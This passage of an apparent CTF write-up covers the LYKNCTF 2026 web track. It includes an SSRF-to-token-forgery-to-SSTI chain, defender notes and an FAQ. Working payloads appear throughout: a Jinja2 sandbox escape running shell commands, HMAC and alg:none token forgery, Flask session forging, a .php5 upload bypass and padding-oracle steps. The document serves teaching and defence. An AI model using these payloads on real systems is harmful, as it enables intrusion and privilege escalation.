POST to `/mirror` fetches `logo_url` server-side and stores the response as a cached text preview. Textbook SSRF surface.

#### Step 2 — Probe the SSRF filter

```
http://127.0.0.1:8080/flag         → Rejected: loopback targets are blocked.
http://2130706433:8080/admin       → Rejected: numeric hostnames are blocked.
http://0x7f000001:8080/admin       → Fetch failed (bypasses filter, no HTTP server listening)
```

Loopback and numeric hostname filters exist, but they don't cover Docker/service DNS. The interesting target is the internal service name `cache-proxy`:

```
http://cache-proxy:5000/
→ TEAM_SLUG=vrp-alpha
  INVITE_KEY_PART=renderer-preview-seed
  BUILD_LABEL=invoice-renderer-debug
  INSTANCE_SEED=761fad0002c093ec372054eb069da5f1
  DEBUG_ASSET=/static/internal-app.js.map
```

The internal service leaks the invite-token parameters and the path to a debug source map.

#### Step 3 — Read the internal source map

Fetching `http://cache-proxy:5000/static/internal-app.js.map` returns the debug source, which documents:

```js
const hiddenRoute = '/invite/accept';
const requiredScope = 'backoffice';
const requiredRole = 'admin';

function deriveSecret(inviteKeyPart, teamSlug, release, instanceSeed) {
  return sha256(`${inviteKeyPart}:${teamSlug}:${release}:${instanceSeed}`);
}

function buildInviteToken(email, exp, release, teamSlug, inviteKeyPart, instanceSeed) {
  const payload = { email, exp, role: requiredRole, scope: requiredScope, team: teamSlug };
  const encoded = base64url(canonicalJson(payload));
  const signature = hmacSha256(canonicalJson(payload), deriveSecret(...));
  return `${encoded}.${signature}`;
}
```

The missing `release` parameter is already in every frontend response:

```
X-Release: review-2026.04-teamA
```

Now we have all four inputs to derive the HMAC key:

```
inviteKeyPart = renderer-preview-seed
teamSlug      = vrp-alpha
release       = review-2026.04-teamA
instanceSeed  = 761fad0002c093ec372054eb069da5f1
```

#### Step 4 — Forge the admin invite

Payload for the currently logged-in email, `role:"admin"`, `scope:"backoffice"`, sorted keys, compact JSON:

```json
{"email":"codax1783467597@example.com","exp":1783471548,"role":"admin","scope":"backoffice","team":"vrp-alpha"}
```

Signature: HMAC-SHA256 hex of the canonical JSON, with key `sha256(f"{inviteKeyPart}:{teamSlug}:{release}:{instanceSeed}")`.

Final token: `base64url(canonical_json(payload)) + "." + hmac_sha256_hex(canonical_json(payload), derived_secret)`.

Submitting to `/invite/accept`:

```
POST /invite/accept token=<forged>
→ 302 Location: /admin
```

The dashboard now shows `role: admin`.

#### Step 5 — Jinja2 SSTI on the admin billing template

The admin page has a billing template form. The JavaScript blocks `{{` and `{%` client-side, but posting directly bypasses that. A test probe:

```
billing_template=Hello {{7*7}}
→ Hello 49
```

The object model confirms Flask/Jinja2:

```
{{ config }}  → <Config {...}>
{{ self }}    → <TemplateReference None>
```

Standard Jinja2 sandbox escape:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
→ uid=0(root) gid=0(root) groups=0(root)
```

Find the flag:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -maxdepth 3 -type f -iname "*flag*" 2>/dev/null').read() }}
→ /flag.txt
```

Read it:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt 2>/dev/null').read() }}
→ LYKNCTF{ae62bd024ee543c5b7e079a02c48542b}
```

Per-challenge README + full 5-stage exploit + captured artifacts: [web/vendor-review-portal](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/vendor-review-portal).

Five individually small issues compose into a full chain: a hidden fetch route reachable by normal users; SSRF filter that blocks loopback but not service DNS; internal debug service exposing per-instance signing material; source map documenting the exact admin invite token format; and admin billing preview rendering attacker-controlled Jinja2. Removing any one link would break the chain: don't ship source maps to production; don't put signing seeds in an SSRF-reachable service; deny all internal networks (not just loopback) in server-side fetchers; use a sandboxed template engine that doesn't expose Python builtins.

## Cross-cutting defender notes

Six patterns recur across the LYKNCTF web track and translate directly into production code review.

**Bodies on 3xx responses are wire-only.** Right in front of your eyes is the direct dramatisation. Any value the server writes into a 302 body is invisible to browsers, dev-tools, network-tab previews, and any downstream client that follows redirects transparently. The corresponding review rule: whatever a server returns must be safe to disclose to any client that reads the wire (curl, an intercepting proxy, a mobile SDK that logs raw responses). If the answer is "only browsers ever see this," the wire behaviour is invisible-by-accident.

**UI cadence is not a rate limit.** Spawn Race's SPAWN button was the only throttle in the pipeline. Anything a browser can send, a script can send faster. Rate checks have to live on the server, applied to the received frame stream, not to what the UI is allowed to emit. Any client-side "cannot click faster than X" mitigation is a UX affordance, not a security control. The defensive review pattern: for every WebSocket/HTTP endpoint, ask "what is the received-side throttle?" If the answer is "the UI doesn't let the user do it faster," it isn't a throttle.

**Client-side state signed with a leakable key is client-controlled state.** Freebie's Flask session and Vendor Review Portal's HMAC-signed invite both fall the moment the signing material leaks. Flask sessions leak through `app.secret_key`; the invite tokens leak through the source map. In production terms: session tokens, invite links, one-time codes, password-reset URLs, and any client-round-trippable data signed with a shared secret all need the secret managed like a secret. That means it lives in secrets management, not in source (Freebie), not in an SSRF-reachable service (Vendor Review Portal), not in a source map (Vendor Review Portal), not in a debug endpoint (Freebie).

**Case-sensitive path matching is not deny-listing.** LYKN Mail's nginx block on lowercase `/backup` walks past every `/BACKUP`, `/Backup`, `/BaCkUp` variant. The nginx-idiomatic fix is `location ~* ^/backup` (case-insensitive regex match). The deeper fix is that files that should not be reachable should not be on disk in the first place. `robots.txt` naming the path is the second layer of the same mistake.

**Distinct error classes are oracles.** Legacy Profile Importer's three-way error distinction between padding failure, JSON failure, and success is textbook padding-oracle material. The single most important discipline in any decrypt-then-parse pipeline is that every rejection must look the same to the client: same body, same status, same timing. Once "invalid padding" is separable from "invalid content", the key doesn't matter. Modern authenticated encryption (AES-GCM, ChaCha20-Poly1305) eliminates the class entirely; if you need CBC for legacy compatibility, verify the HMAC first, then decrypt, then parse, and never leak the intermediate step through the error surface.

**Filename allow-lists over extension deny-lists.** OCR's `.php`/`.phtml`/`.phar` blacklist missed `.php5`. FU Career's `admin.php`-behind-auth strategy assumed admins would never SQL-inject. Deny-lists are complete only for the vulnerabilities you've enumerated; allow-lists are complete for everything you've explicitly approved. When user input touches the filesystem, disk paths, template engines, or `mysqli_query`, the failure surface is broader than any deny-list can enumerate; pick a positive set and let the negative set be "everything else."

## Frequently asked questions

### What is LYKNCTF 2026?

LYKNCTF 2026 is a CTF whose challenges are grouped into four tracks: web (10 challenges covered in this writeup), crack (reverse-engineering, 9 challenges), pwn (3 challenges), and forensics (4 challenges). The web-track flag prefix is `LYKNCTF{...}` (one challenge, FU Career, uses `LYKN{...}` for design reasons). All ten web challenges are mirrored with per-challenge READMEs, artifacts, and solver scripts at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF).

### Why does browsing to the Right in front of your eyes challenge not show the flag?

Because the flag is in the body of the 302 redirect response, and browsers drop 3xx bodies before ever rendering them. RFC 9110 §15.4 explicitly allows a 3xx response to include a body ("SHOULD contain a short hypertext note with a hyperlink to the different URI(s)"), but the browser treats every 3xx as a control message: it reads `Location:`, discards the body, and issues the follow-up request. The payload is never rendered and never shown in the network-tab preview. `curl -i` without `-L` behaves like the wire and prints exactly what the server sent, including bodies attached to redirects.

### How does the WebSocket race work in Spawn Race?

The server tracks a per-connection counter. The sixth received `spawn` frame within a tight time window returns `{"type":"spawned",...,"race":"won","flag":"..."}`. A human clicking the SPAWN button can only produce about 10 clicks/second, and each click is followed by a browser microtask drain and audio-play call, so the received-side cadence is well below the race window. A scripted client that sends six pipelined WebSocket frames before reading any replies trips the counter. Slower cadences reset it.

### Why does /Backup bypass the nginx block on /backup in LYKN Mail?

nginx `location` matching is case-sensitive by default. A block written as `location /backup { deny all; }` matches only the literal path `/backup`. Any request whose path differs only in case (`/Backup`, `/BACKUP`, `/BaCkUp`, and so on) doesn't match the block and falls through to whatever other location matches, in this case the default autoindex-enabled root. The case-insensitive fix is `location ~* ^/backup`. The stronger fix is not to expose backup files at all.

### What is the CBC-R attack in Legacy Profile Importer?

CBC-R (CBC Reverse) is the standard construction that turns a padding oracle into full plaintext control. Given an oracle that distinguishes "PKCS7 valid" from "PKCS7 invalid," you can recover `D(C)` for any ciphertext block `C` byte-by-byte in ~256 requests per byte. Once you have `D(C)`, the CBC decryption equation `P_i = D(C_i) XOR C_{i-1}` lets you choose `C_{i-1}` freely to make `P_i` anything you want. In this challenge, target plaintext is `{"role":"admin"}` (16 bytes) followed by `\x10 * 16` (valid PKCS7 pad for a 16-byte payload), and the ciphertext layout is `IV || Y1 || Y2` where Y2 is any 16 bytes.

### What is the environment `FLAG` decoy in FU Career?

Once you get RCE on FU Career via the SQLi-to-webshell chain, `env` shows `FLAG=LYKNCTF{e3a8e2d20fad487b89564ec974f6d9d9}`. That string is flag-shaped, matches the format, and is not accepted by the scoring engine. The real flag is split between `admin.php`'s `part1: LYKN{default_cred` and a root-only `/part2.txt` readable only through the SUID `csvtool` binary. The decoy is a deliberate demonstration that a "found a flag-shaped string" moment during any exploit chain needs a second confirmation before it becomes a submitted flag.

### How does the leaked `window.API_KEY` in Gold hunters lead to the flag?

The API key is embedded in the root HTML as `window.API_KEY = "..."`. That single value is enough to authenticate against `/api/get-flag`, a hidden route documented in `/api/openapi.json`. The frontend never calls that route (the JavaScript only uses the key for `POST /api/contact`), so it looks like it isn't reachable from user code. The OpenAPI schema is public documentation, and the key is public credentials. `curl -H 'X-API-Key: <leaked>' /api/get-flag` returns the flag directly.

### What is the Flask debug hook bug in Freebie?

The application ships with:

```python
@app.before_request
def before_request():
    if "debug" in request.args:
        with open(__file__, "r") as f:
            source_code = f.read()
        return f"<body ...><pre>{source_code}</pre></body>"
```

Any request to any route with `?debug=1` returns the current file's source. That source contains `app.secret_key = "sup3r_s3cr3t_ctf_k3y_727"`, which is the shared secret for Flask's client-side signed sessions. Once the key is known, `flask-unsign --sign --cookie "{'username':'admin'}" --secret '<leaked>'` forges an admin session, and `/flag` (which only checks `session.get('username')`) returns the flag.

### How does the `alg:none` bypass work in Discord Nitro?

The JWT header specifies the signing algorithm the server should use to verify. RFC 7519 defines `alg:"none"` as the "unsecured JWS" option: the token has no signature and the verifier is expected to reject it. Implementations that route the alg field through a lookup table without an explicit allow-list can be tricked into using the `none` handler instead of `HS256`, at which point any forged payload is accepted. The forge is `hdr.payload.` with an empty signature (trailing dot mandatory) and compact JSON (`separators=(',',':')` to avoid whitespace that might change canonicalisation).

### How does the OCR challenge get code execution?

Two partial defences that composed into a full bypass. The extension blacklist blocked `.php`, `.phtml`, `.phar`, `.PHP` (case-normalised), but missed `.php5`, a legacy Apache/PHP extension the server still passes to the PHP handler. The content blacklist blocked `<?php` and `<?=` and dangerous function names like `system` and `eval`, but PHP short tags (`<?`) were still enabled in `php.ini`. Payload: OCR an image containing `<? include "/flag"; ?>`, save the recognised text as `<name>.php5`, request the saved file. PHP executes the short-tag block and includes `/flag`.

### What's the SSRF chain in Vendor Review Portal?

Five stages. (1) The hidden `/mirror` route fetches user-supplied URLs server-side. (2) The SSRF filter blocks loopback and numeric hostnames but not internal service DNS. Fetching `http://cache-proxy:5000/` leaks HMAC seed material (`INVITE_KEY_PART`, `TEAM_SLUG`, `INSTANCE_SEED`) and a debug source-map path. (3) The source map documents the exact HMAC-invite construction (`sha256(inviteKeyPart:teamSlug:release:instanceSeed)` as HMAC key over canonical-JSON payload). (4) Forge an admin invite for your own email, POST to `/invite/accept`, become admin. (5) The admin billing preview renders Flask/Jinja2 templates server-side without sandboxing; `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}` returns the flag.

### What's the broader lesson from the LYKNCTF 2026 web track?

Treat the browser as one HTTP client among many. Half the track's flags live on code paths the browser never reaches: 302 bodies, WebSocket frames with unused fields, OpenAPI-documented routes with no frontend link, `.php5` extensions the extension blacklist forgot, source maps shipped alongside internal services. The disciplined move is to read the wire before the DOM: `curl -i` before opening a browser, decode every base64 in every cookie, list the routes in `/api/openapi.json`, inspect the `X-` response headers, walk any JavaScript source map you can reach. The browser's rendering is a projection of the server's response; the response itself is the thing under test.

### Where can I find the solver scripts?

Per-challenge READMEs, artifacts, and runnable solvers are at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF). Each web challenge has a `solve.sh` or `exploit.py` that reproduces the flag against a fresh instance URL. Some challenges (Legacy Profile Importer, LYKN Mail) use per-instance flags; the solver scripts replay the exploit against whatever URL is passed on the command line.

## Closing notes

Ten web challenges, ten primitives, one CTF. The track's design signature is the "flag on a code path the browser can't reach" pattern: 302 bodies, WebSocket bursts, `.php5` short-tag execution, `alg:none` header trust, OpenAPI schema disclosure, source-map documentation, HMAC seed leaks through service DNS. The pedagogy is protocol literacy: HTTP semantics, WebSocket framing, JWT structure, PKCS7 padding, source-map format, OpenAPI. Every one of those is documented, standardised, and freely readable; the challenge trains the muscle of actually reading them instead of accepting the browser's projection.

For more web-track writeups on this site, the [RIFFHACK 2026 master writeup](/ctf-writeups/riffhack-2026-writeup/) covers twelve challenges built around a Next.js darknet marketplace, including Next.js `nxtP` query prefix confusion, `alg:none` JWT, IMDS SSRF, and path-traversal LFI. The [SEKAI CTF 2026 master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) includes the Migurimental Next.js triple-bug and TON blockchain exploits alongside binary and reverse challenges. The [Anti-Slop CTF 2026 web writeup](/ctf-writeups/anti-slopctf-2026-web-writeup/) covers adjacent shell-injection and source-recovery chains. The [V1t CTF 2026 master writeup](/ctf-writeups/v1t-ctf-2026-writeup/) includes another `?`-glob shell-filter bypass. The full [CTF writeups index](/ctf-writeups/) is the home for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is LYKNCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "LYKNCTF 2026 is a CTF whose challenges are grouped into four tracks: web (10 challenges covered in this writeup), crack (9), pwn (3), and forensics (4). Web-track flag prefix is LYKNCTF{...}. All ten web challenges are mirrored with per-challenge READMEs, artifacts, and solver scripts at github.com/Abdelkad3r/LYKNCTF."}},
    {"@type": "Question","name": "Why does browsing to Right in front of your eyes not show the flag?","acceptedAnswer": {"@type": "Answer","text": "The flag is in the body of the 302 redirect response. RFC 9110 §15.4 allows 3xx responses to include a body, but browsers drop 3xx bodies before rendering: they read Location:, discard the body, and issue the follow-up. curl -i without -L behaves like the wire and prints the body directly."}},
    {"@type": "Question","name": "How does the WebSocket race work in Spawn Race?","acceptedAnswer": {"@type": "Answer","text": "The server tracks a per-connection counter. The sixth spawn frame within a tight time window returns a race:won reply with the flag. Button clicking at 10Hz plus microtask drain and audio-play calls is well below the race window. A scripted client that pipelines six frames before reading any reply trips the counter."}},
    {"@type": "Question","name": "Why does /Backup bypass the nginx block on /backup in LYKN Mail?","acceptedAnswer": {"@type": "Answer","text": "nginx location matching is case-sensitive by default. A block written as location /backup { deny all; } matches only /backup. /Backup, /BACKUP, /BaCkUp fall through to the default location, which had autoindex enabled. The fix is location ~* ^/backup for case-insensitive matching."}},
    {"@type": "Question","name": "What is the CBC-R attack in Legacy Profile Importer?","acceptedAnswer": {"@type": "Answer","text": "CBC-R turns a padding oracle into full plaintext control. Recover D(C) for any ciphertext block C byte-by-byte in ~256 requests per byte using the pad-valid/pad-invalid oracle. Then P_i = D(C_i) XOR C_{i-1} lets you choose C_{i-1} freely to make P_i anything you want. Target: {\"role\":\"admin\"} + \\x10*16 as valid PKCS7."}},
    {"@type": "Question","name": "What is the environment FLAG decoy in FU Career?","acceptedAnswer": {"@type": "Answer","text": "After the SQLi-to-webshell chain, env shows FLAG=LYKNCTF{e3a8e2d20fad487b89564ec974f6d9d9}. That string is flag-shaped and not accepted. The real flag is split between admin.php's part1: LYKN{default_cred and a root-only /part2.txt readable via SUID csvtool: csvtool col 1 /part2.txt returns ential_sqli2rce_r0n4d0_m3ss1}."}},
    {"@type": "Question","name": "How does the leaked window.API_KEY in Gold hunters lead to the flag?","acceptedAnswer": {"@type": "Answer","text": "The API key is embedded in root HTML as window.API_KEY. /api/openapi.json documents a hidden GET /api/get-flag that requires X-API-Key. The frontend never calls that route. curl -H 'X-API-Key: <leaked>' /api/get-flag returns the flag."}},
    {"@type": "Question","name": "What is the Flask debug hook bug in Freebie?","acceptedAnswer": {"@type": "Answer","text": "A global @app.before_request hook returns open(__file__).read() when ?debug=1 is present, on any route. That leaks app.secret_key = 'sup3r_s3cr3t_ctf_k3y_727'. With the key, flask-unsign --sign --cookie \"{'username':'admin'}\" forges an admin session, and /flag returns the flag."}},
    {"@type": "Question","name": "How does the alg:none bypass work in Discord Nitro?","acceptedAnswer": {"@type": "Answer","text": "The verifier routes the JWT alg field through a lookup table without an allow-list, so alg:none skips the signature check. Forge: {\"alg\":\"none\",\"typ\":\"JWT\"} header, {\"user\":\"admin\",\"role\":\"admin\"} payload, empty signature. Trailing dot required (hdr.payload.) so the token still parses as three segments. Compact JSON avoids canonicalisation issues."}},
    {"@type": "Question","name": "How does the OCR challenge get code execution?","acceptedAnswer": {"@type": "Answer","text": "Extension blacklist blocked .php/.phtml/.phar/.PHP but missed .php5. Content blacklist blocked <?php and <?= but PHP short tags (<?) were enabled. Payload: OCR an image of <? include \"/flag\"; ?>, save as filename.php5, request the saved file. PHP executes the short-tag block and includes /flag."}},
    {"@type": "Question","name": "What is the SSRF chain in Vendor Review Portal?","acceptedAnswer": {"@type": "Answer","text": "Five stages: (1) hidden /mirror route SSRFs user URLs; (2) SSRF filter allows internal service DNS (cache-proxy:5000) which leaks HMAC seed and source-map path; (3) source map documents the HMAC-invite construction; (4) forge admin invite for own email, POST /invite/accept, become admin; (5) admin billing preview is Flask/Jinja2 SSTI. {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }} returns the flag."}},
    {"@type": "Question","name": "What's the broader lesson from the LYKNCTF 2026 web track?","acceptedAnswer": {"@type": "Answer","text": "Treat the browser as one HTTP client among many. Half the track's flags live on code paths the browser never reaches: 302 bodies, WebSocket frames with unused fields, OpenAPI-documented routes with no frontend link, .php5 extensions, source maps shipped alongside internal services. Read the wire before the DOM: curl -i first, decode every base64 in every cookie, list /api/openapi.json, inspect X- response headers, walk source maps."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, artifacts, and runnable solvers are at github.com/Abdelkad3r/LYKNCTF. Each web challenge has a solve.sh or exploit.py that reproduces the flag against a fresh instance URL. Some challenges (Legacy Profile Importer, LYKN Mail) use per-instance flags; solvers replay the exploit against whatever URL is passed."}}
  ]
}
</script>
